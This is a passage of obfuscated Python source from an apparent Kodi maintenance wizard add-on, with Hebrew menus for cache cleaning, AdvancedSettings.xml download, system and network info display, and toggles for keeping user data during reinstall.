	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OO00O00O0OOO0O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	if O00OO00O00O0OOO0O =='true':#line:2902
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0OO00OO0O0O0O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOO00O000O00000O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OO0OOO0000O000O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO0000OO0O0O0OO0O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2907
	addFile ('Include Video Cache in Clear Cache: %s'%O0OOO00OO0O00OO00 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	if O0OOO00OO0O00OO00 =='true':#line:2909
		addFile ('--- Include All Video Addons: %s'%O00O0O0OO0OO00000 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Bob: %s'%O0OO00OO0OO00000O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Phoenix: %s'%O000OO0OO0OOOO00O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Specto: %s'%OO0O00O00OO0O0000 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Exodus: %s'%O000OO0OOOO0OO0O0 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Salts: %s'%OO00O0O000OOOOO0O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Salts HD Lite: %s'%O0OO0O00000000OO0 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include One Channel: %s'%O00OO0OOOO00000OO .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Genesis: %s'%OO00OO0O000000O0O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2920
	setView ('files','viewType')#line:2921
def advancedWindow (url =None ):#line:2923
	if not ADVANCEDFILE =='http://':#line:2924
		if url ==None :#line:2925
			OOO0000O0O000OOOO =wiz .workingURL (ADVANCEDFILE )#line:2926
			O0000OOO00000OOO0 =uservar .ADVANCEDFILE #line:2927
		else :#line:2928
			OOO0000O0O000OOOO =wiz .workingURL (url )#line:2929
			O0000OOO00000OOO0 =url #line:2930
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if os .path .exists (ADVANCED ):#line:2932
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if OOO0000O0O000OOOO ==True :#line:2935
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			OO0OOOO0OO0O0000O =wiz .openURL (O0000OOO00000OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2937
			OO000OO0O00OO0OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OOOO0OO0O0000O )#line:2938
			if len (OO000OO0O00OO0OOO )>0 :#line:2939
				for O0O00OOOOO000O00O ,OO0O0OO0O00O00OO0 ,url ,OOO0O00O0OO0O0000 ,O0000O0O00O0OOOOO ,OO000OOOOO0OOO00O in OO000OO0O00OO0OOO :#line:2940
					if OO0O0OO0O00O00OO0 .lower ()=="yes":#line:2941
						addDir ("[B]%s[/B]"%O0O00OOOOO000O00O ,'advancedsetting',url ,description =OO000OOOOO0OOO00O ,icon =OOO0O00O0OO0O0000 ,fanart =O0000O0O00O0OOOOO ,themeit =THEME3 )#line:2942
					else :#line:2943
						addFile (O0O00OOOOO000O00O ,'writeadvanced',O0O00OOOOO000O00O ,url ,description =OO000OOOOO0OOO00O ,icon =OOO0O00O0OO0O0000 ,fanart =O0000O0O00O0OOOOO ,themeit =THEME2 )#line:2944
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2945
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0000O0O000OOOO )#line:2946
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2947
def writeAdvanced (O00O0OOO00O0OO000 ,OOOO00OOOO000O0O0 ):#line:2949
	OO00O00O0OOOO0000 =wiz .workingURL (OOOO00OOOO000O0O0 )#line:2950
	if OO00O00O0OOOO0000 ==True :#line:2951
		if os .path .exists (ADVANCED ):O0O0O0O0O000000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOO00O0OO000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2952
		else :O0O0O0O0O000000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOO00O0OO000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2953
		if O0O0O0O0O000000O0 ==1 :#line:2955
			O0000O0O000000OO0 =wiz .openURL (OOOO00OOOO000O0O0 )#line:2956
			O0OO00O0O000000O0 =open (ADVANCED ,'w');#line:2957
			O0OO00O0O000000O0 .write (O0000O0O000000OO0 )#line:2958
			O0OO00O0O000000O0 .close ()#line:2959
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2960
			wiz .killxbmc (True )#line:2961
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2962
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O00O0OOOO0000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2963
def viewAdvanced ():#line:2965
	OO00OO0O0OO0000OO =open (ADVANCED )#line:2966
	O0O0000OOO0OO0000 =OO00OO0O0OO0000OO .read ().replace ('\t','    ')#line:2967
	wiz .TextBox (ADDONTITLE ,O0O0000OOO0OO0000 )#line:2968
	OO00OO0O0OO0000OO .close ()#line:2969
def removeAdvanced ():#line:2971
	if os .path .exists (ADVANCED ):#line:2972
		wiz .removeFile (ADVANCED )#line:2973
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2974
def showAutoAdvanced ():#line:2976
	notify .autoConfig ()#line:2977
def getIP ():#line:2979
	OO00OOOOOOO00OO0O ='http://whatismyipaddress.com/'#line:2980
	if not wiz .workingURL (OO00OOOOOOO00OO0O ):return 'Unknown','Unknown','Unknown'#line:2981
	OOOOO0O00O0OOOO0O =wiz .openURL (OO00OOOOOOO00OO0O ).replace ('\n','').replace ('\r','')#line:2982
	if not 'Access Denied'in OOOOO0O00O0OOOO0O :#line:2983
		O0O0OOOOOOO000OOO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOOO0O00O0OOOO0O )#line:2984
		OOOOO0O000OO00O00 =O0O0OOOOOOO000OOO [0 ]if (len (O0O0OOOOOOO000OOO )>0 )else 'Unknown'#line:2985
		O0O00O0000000OO00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOOO0O00O0OOOO0O )#line:2986
		O0O00O0O0OOOO000O =O0O00O0000000OO00 [0 ]if (len (O0O00O0000000OO00 )>0 )else 'Unknown'#line:2987
		O0OOOOO00OOO00O00 =O0O00O0000000OO00 [1 ]+', '+O0O00O0000000OO00 [2 ]+', '+O0O00O0000000OO00 [3 ]if (len (O0O00O0000000OO00 )>2 )else 'Unknown'#line:2988
		return OOOOO0O000OO00O00 ,O0O00O0O0OOOO000O ,O0OOOOO00OOO00O00 #line:2989
	else :return 'Unknown','Unknown','Unknown'#line:2990
def systemInfo ():#line:2992
	OOOO0O000OO00O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3006
	OO0OO0O0OO0OOO000 =[];O0O0O00O000OOO0O0 =0 #line:3007
	for OOOO0O0000OO00O00 in OOOO0O000OO00O0O0 :#line:3008
		OOO0OO0OOO0O0OO00 =wiz .getInfo (OOOO0O0000OO00O00 )#line:3009
		OO000OO000OO0O0O0 =0 #line:3010
		while OOO0OO0OOO0O0OO00 =="Busy"and OO000OO000OO0O0O0 <10 :#line:3011
			OOO0OO0OOO0O0OO00 =wiz .getInfo (OOOO0O0000OO00O00 );OO000OO000OO0O0O0 +=1 ;wiz .log ("%s sleep %s"%(OOOO0O0000OO00O00 ,str (OO000OO000OO0O0O0 )));xbmc .sleep (1000 )#line:3012
		OO0OO0O0OO0OOO000 .append (OOO0OO0OOO0O0OO00 )#line:3013
		O0O0O00O000OOO0O0 +=1 #line:3014
	O0000O0000O0OO0OO =OO0OO0O0OO0OOO000 [8 ]if 'Una'in OO0OO0O0OO0OOO000 [8 ]else wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [8 ][:-8 ]))*1024 *1024 )#line:3015
	OOO000OOOO0OOO000 =OO0OO0O0OO0OOO000 [9 ]if 'Una'in OO0OO0O0OO0OOO000 [9 ]else wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [9 ][:-8 ]))*1024 *1024 )#line:3016
	O0000O0OOOO00OO0O =OO0OO0O0OO0OOO000 [10 ]if 'Una'in OO0OO0O0OO0OOO000 [10 ]else wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [10 ][:-8 ]))*1024 *1024 )#line:3017
	OO0O0OO0OO0O000O0 =wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [11 ][:-2 ]))*1024 *1024 )#line:3018
	OO0O0OOO00O00000O =wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [12 ][:-2 ]))*1024 *1024 )#line:3019
	O0O00O0O0O0OO000O =wiz .convertSize (int (float (OO0OO0O0OO0OOO000 [13 ][:-2 ]))*1024 *1024 )#line:3020
	O0OOOO00OO000OOOO ,OOOOOOO0O000OO000 ,O0OOO000OOO00OOO0 =getIP ()#line:3021
	OOOOO0O0000O00O00 =[];OOO00O00O0000O00O =[];O0000OOOOOOO00000 =[];OO000OOO000OO000O =[];O000000O00OO0O0O0 =[];O0O00O00OO0O00O00 =[];OO0O0OOO0OO0OO00O =[]#line:3023
	OOO0O00O000OO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	for O00O0000000OOO000 in sorted (OOO0O00O000OO0OOO ,key =lambda O0OO00OO0OOO00O00 :O0OO00OO0OOO00O00 ):#line:3026
		OOO0O0OO0000000OO =os .path .split (O00O0000000OOO000 [:-1 ])[1 ]#line:3027
		if OOO0O0OO0000000OO =='packages':continue #line:3028
		OOOOOO00O00000OOO =os .path .join (O00O0000000OOO000 ,'addon.xml')#line:3029
		if os .path .exists (OOOOOO00O00000OOO ):#line:3030
			O00OOOO0O0000OO00 =open (OOOOOO00O00000OOO )#line:3031
			OO0OO000O000O0000 =O00OOOO0O0000OO00 .read ()#line:3032
			O0O00O000OOOOO00O =re .compile ("<provides>(.+?)</provides>").findall (OO0OO000O000O0000 )#line:3033
			if len (O0O00O000OOOOO00O )==0 :#line:3034
				if OOO0O0OO0000000OO .startswith ('skin'):OO0O0OOO0OO0OO00O .append (OOO0O0OO0000000OO )#line:3035
				if OOO0O0OO0000000OO .startswith ('repo'):O000000O00OO0O0O0 .append (OOO0O0OO0000000OO )#line:3036
				else :O0O00O00OO0O00O00 .append (OOO0O0OO0000000OO )#line:3037
			elif not (O0O00O000OOOOO00O [0 ]).find ('executable')==-1 :OO000OOO000OO000O .append (OOO0O0OO0000000OO )#line:3038
			elif not (O0O00O000OOOOO00O [0 ]).find ('video')==-1 :O0000OOOOOOO00000 .append (OOO0O0OO0000000OO )#line:3039
			elif not (O0O00O000OOOOO00O [0 ]).find ('audio')==-1 :OOO00O00O0000O00O .append (OOO0O0OO0000000OO )#line:3040
			elif not (O0O00O000OOOOO00O [0 ]).find ('image')==-1 :OOOOO0O0000O00O00 .append (OOO0O0OO0000000OO )#line:3041
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0000O0OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOOO0OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OOOO00OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO0OO0O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOO00O00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O0O0OO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00OO000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOO0O000OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000OOO00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OOO000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	O0O0OO0OOOOO000OO =len (OOOOO0O0000O00O00 )+len (OOO00O00O0000O00O )+len (O0000OOOOOOO00000 )+len (OO000OOO000OO000O )+len (O0O00O00OO0O00O00 )+len (OO0O0OOO0OO0OO00O )+len (O000000O00OO0O0O0 )#line:3071
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O0OO0OOOOO000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000OOOOOOO00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000OOO000OO000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00O00O0000O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0O0000O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000000O00OO0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OOO0OO0OO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00O00OO0O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
def Menu ():#line:3080
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3081
def saveMenu ():#line:3083
	O000O00OO00OO0O00 ='[COLOR yellow]מופעל[/COLOR]';OO0OO000O00OO0OO0 ='[COLOR blue]מבוטל[/COLOR]'#line:3085
	OO0OOOO0O0000000O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3086
	O0OOO00O0OO0OOOO0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3087
	OO00OO00000OOOOO0 ='true'if KEEPINFO =='true'else 'false'#line:3088
	O000OO0OOOOO0OOO0 ='true'if KEEPSOUND =='true'else 'false'#line:3090
	O000000OO0O0O0000 ='true'if KEEPVIEW =='true'else 'false'#line:3091
	O00O000O0O0O000O0 ='true'if KEEPSKIN =='true'else 'false'#line:3092
	O0000OOO0O0OO0OO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3093
	OOOOO0OOOOOOO0O0O ='true'if KEEPSKIN3 =='true'else 'false'#line:3094
	O00OOO0OO0O0000O0 ='true'if KEEPADDONS =='true'else 'false'#line:3095
	OOO0O00OOOO000O00 ='true'if KEEPPVR =='true'else 'false'#line:3096
	O00OO00000OO0OO00 ='true'if KEEPTVLIST =='true'else 'false'#line:3097
	OOOOO00OO00000OO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3098
	O0OO000OO00000O0O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3099
	O00OO0OO0O0OOO0O0 ='true'if KEEPHUBTV =='true'else 'false'#line:3100
	O0OO0OO0OOOO0O0OO ='true'if KEEPHUBVOD =='true'else 'false'#line:3101
	O0O0O0OOO00O0O0OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3102
	OOO00O00OOOOOO0OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:3103
	O00OOO0OOO00O0OOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3104
	O0OOO0OOO0OO0OO00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3105
	OO00OO0OOO0000OO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3106
	O0O0O000000OO0000 ='true'if KEEPTRAKT =='true'else 'false'#line:3107
	OO00O0O000000OO00 ='true'if KEEPREAL =='true'else 'false'#line:3108
	OOO0OOOOO0O0O0000 ='true'if KEEPRD2 =='true'else 'false'#line:3109
	O00OO000O0OO0O0OO ='true'if KEEPTORNET =='true'else 'true'#line:3110
	OOO0OO0O0O000OOO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3111
	O00OO000OOOOOOOO0 ='true'if KEEPSOURCES =='true'else 'false'#line:3112
	OOO0OOOO00O0OO00O ='true'if KEEPADVANCED =='true'else 'false'#line:3113
	OO0O0OOO00000OOOO ='true'if KEEPPROFILES =='true'else 'false'#line:3114
	O0000OOO000O00O00 ='true'if KEEPFAVS =='true'else 'false'#line:3115
	O0O000OO0OO0000OO ='true'if KEEPREPOS =='true'else 'false'#line:3116
	OO0OOOOO0OO0O000O ='true'if KEEPSUPER =='true'else 'false'#line:3117
	OOO00O0OOOO00OO00 ='true'if KEEPWHITELIST =='true'else 'false'#line:3118
	OO0O000O000OO000O ='true'if KEEPWEATHER =='true'else 'false'#line:3119
	OOO000O0O0O000000 ='true'if KEEPVICTORY =='true'else 'false'#line:3120
	O0OO0OO00000O0000 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3121
	if OOO00O0OOOO00OO00 =='true':#line:3123
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3125
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון RD:  '%OO00O0O000000OO00 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון טראקט:  '%O0O0O000000OO0000 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מועדפים:  '%O0000OOO000O00O00 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOO0O00OOOO000O00 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OOO000O0O0O000000 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OO0OO00000O0000 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00OO00000OO0OO00 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח סרטים:  '%OOOOO00OO00000OO0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח סדרות:  '%O0OO000OO00000O0O .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח טלויזיה:  '%O00OO0OO0O0OOO0O0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OO0OO0OOOO0O0OO .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח ספורט:  '%O0O0O0OOO00O0O0OO .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח ילדים:  '%OOO00O00OOOOOO0OO .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח מוסיקה:  '%O00OOO0OOO00O0OOO .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0OOO0OOO0OO0OO00 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת כל האריחים בסקין:  '%O00O000O0O0O000O0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0O000O000OO000O .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00OOO0OO0O0000O0 .replace ('true',O000O00OO00OO0O00 ).replace ('false',OO0OO000O00OO0OO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
